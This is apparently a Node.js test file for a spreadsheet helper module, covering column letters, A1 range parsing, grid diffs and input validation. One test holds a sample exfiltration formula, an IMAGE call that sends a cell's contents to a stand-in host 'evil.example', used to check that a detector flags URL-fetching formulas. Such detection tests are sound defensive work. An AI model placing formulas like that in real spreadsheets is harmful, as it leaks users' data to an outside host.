import test from "node:test";
import assert from "node:assert/strict";
import {
  columnToLetters,
  lettersToColumn,
  parseRangeStart,
  targetRange,
  diffGrid,
  urlFetchingFormulas,
  assertGridSize,
  gridSchema,
  MAX_CELLS,
} from "../src/sheets.js";

test("column letters round-trip, including past Z", () => {
  for (const [n, s] of [
    [1, "A"],
    [26, "Z"],
    [27, "AA"],
    [52, "AZ"],
    [703, "AAA"],
  ]) {
    assert.equal(columnToLetters(n), s);
    assert.equal(lettersToColumn(s), n);
  }
  assert.equal(lettersToColumn("ab"), 28);
});

test("parseRangeStart finds the sheet and top-left cell in the usual A1 forms", () => {
  assert.deepEqual(parseRangeStart("Sheet1!B2:D5"), { sheet: "Sheet1!", col: 2, row: 2 });
  assert.deepEqual(parseRangeStart("'My Sheet'!C10"), { sheet: "'My Sheet'!", col: 3, row: 10 });
  assert.deepEqual(parseRangeStart("A:C"), { sheet: "", col: 1, row: 1 });
  assert.deepEqual(parseRangeStart("Data!3:5"), { sheet: "Data!", col: 1, row: 3 });
  assert.deepEqual(parseRangeStart("Budget"), { sheet: "Budget!", col: 1, row: 1 });
  assert.deepEqual(parseRangeStart("'Q3 plan'"), { sheet: "'Q3 plan'!", col: 1, row: 1 });
  assert.throws(() => parseRangeStart("Sheet1!not a cell"), /Can't read the start cell/);
});

test("targetRange covers exactly the cells the values will occupy, whatever range was passed", () => {
  const values = [["a", "b", "c"], ["d"]];
  assert.equal(targetRange("Sheet1!B2", values).range, "Sheet1!B2:D3");
  assert.equal(targetRange("Sheet1!B2:Z99", values).range, "Sheet1!B2:D3");
  assert.equal(targetRange("Y1", [["x", "y", "z"]]).range, "Y1:AA1");
});

test("diffGrid lists only changed cells, treating missing as empty", () => {
  const before = [["Name", "Total"], ["Ann"]];
  const after = [
    ["Name", "Total"],
    ["Ann", 42],
    ["", null],
  ];
  assert.deepEqual(diffGrid(before, after, 2, 5), [{ cell: "C6", before: "", after: "42" }]);
  assert.deepEqual(diffGrid([["1"]], [[1]], 1, 1), []); // same value, different JSON type
  assert.deepEqual(diffGrid([["=SUM(A1:A2)"]], [["3"]], 1, 1), [
    { cell: "A1", before: "=SUM(A1:A2)", after: "3" },
  ]);
});

test("urlFetchingFormulas flags formulas that would send data to a URL", () => {
  const values = [
    ["=SUM(A1:A3)", '=IMAGE("https://evil.example/?q="&A1)'],
    ['  =importxml("https://x", "//a")', "IMAGE( not a formula", '=HYPERLINK("https://x")'],
  ];
  assert.deepEqual(urlFetchingFormulas(values, 2, 10), ["C10", "B11", "D11"]);
});

test("grid size and cell types are validated", () => {
  assert.throws(() => assertGridSize([Array(MAX_CELLS + 1).fill(1)]), /Too many cells/);
  assert.ok(gridSchema.safeParse([["a", 1, true, null]]).success);
  assert.ok(!gridSchema.safeParse([[{ formula: "x" }]]).success);
  assert.ok(!gridSchema.safeParse([]).success);
  assert.ok(!gridSchema.safeParse([["x".repeat(50_001)]]).success);
});
